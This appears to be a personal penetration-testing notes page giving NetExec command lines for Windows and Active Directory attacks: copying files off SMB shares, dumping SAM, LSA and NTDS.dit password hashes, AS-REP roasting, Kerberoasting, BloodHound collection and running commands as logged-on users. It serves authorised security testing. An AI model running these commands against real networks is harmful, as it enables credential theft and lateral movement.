---
title: NetExec
source_url: https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/netexec
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: windows
---

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FRbfmSlNyA6i1G0LVCISB%2Fimage.avif?alt=media&amp;token=6005d22b-989a-4dec-805d-bc45fc0f9a20" alt=""><figcaption></figcaption></figure>

NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of *large* networks. It is based on CrackMapExec, which makes the tool familiar to use.

Personally, I think the modules from NetExec make it worth to use the tool.

***

## SMB spidering shares

Spider and export all files from shares:

```
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
```

List all readable files:

```
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus
```

## Dumping hashes

Dumping SAM

```
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

Dumping LSA

```
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

Dumping from NTDS.dit

```
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds --users --enabled
nxc smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

## Bloodhound

If you have creds, you can use nxc to get a zip or .json files for bloodhound

```
nxc ldap <ip> -u user -p pass --bloodhound -ns <ns-ip> --collection All
```

## AS-REP Roasting

Only one user

```
nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
```

List including usernames

```
nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
```

## Kerberoasting

```
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```

## SMB logged on users

```
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --loggedon-users
```

## SMB active sessions

```
nxc smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sessions
```

## SMB Execute commands on behalf of other users

```
nxc smb <ip> -u <localAdmin> -p <password> -M schtask_as -o USER=<logged-on-user> CMD=<cmd-command>
```

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FsxHnFAZxoO0xv2Ff1wK9%2Fimage.avif?alt=media&amp;token=f260e851-1db6-45dc-bff6-1b9a631755ed" alt=""><figcaption></figcaption></figure>
